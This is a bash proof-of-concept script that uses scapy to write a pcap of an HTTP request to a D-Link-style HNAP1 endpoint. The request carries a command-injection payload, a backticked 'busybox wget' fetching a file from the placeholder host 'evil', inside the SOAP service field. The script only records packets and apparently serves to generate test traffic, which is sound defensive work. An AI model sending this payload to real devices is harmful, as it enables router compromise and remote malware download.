#!/usr/bin/env bash
set -euo pipefail
OUT="${1:?usage: poc.sh <out.pcap>}"
python3 - "$OUT" <<'PY'
import sys
from scapy.all import wrpcap, Ether, IP, TCP, Raw
body=(b'<?xml version="1.0" encoding="utf-8"?>'
      b'<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">'
      b'<soap:Body><GetDeviceSettings xmlns="http://purenetworks.com/HNAP1/">'
      b'<service>SetDeviceSettings`busybox wget http://evil/m`</service>'
      b'</GetDeviceSettings></soap:Body></soap:Envelope>')
req=b"POST /HNAP1/ HTTP/1.1\r\nHost: dlink.example\r\nContent-Type: text/xml; charset=utf-8\r\nSOAPAction: \"http://purenetworks.com/HNAP1/GetDeviceSettings\"\r\nContent-Length: "+str(len(body)).encode()+b"\r\nConnection: close\r\n\r\n"+body
S="10.0.0.87";D="10.0.0.80"
C=lambda f,s,a,p=b"":Ether()/IP(src=S,dst=D)/TCP(sport=44564,dport=80,flags=f,seq=s,ack=a)/(Raw(p) if p else b"")
V=lambda f,s,a:Ether()/IP(src=D,dst=S)/TCP(sport=80,dport=44564,flags=f,seq=s,ack=a)
pk=[C("S",1000,0),V("SA",2000,1001),C("A",1001,2001),C("PA",1001,2001,req),V("A",2001,1001+len(req))]
t=1_700_000_000.0
for p in pk:p.time=t;t+=0.01
wrpcap(sys.argv[1],pk)
PY
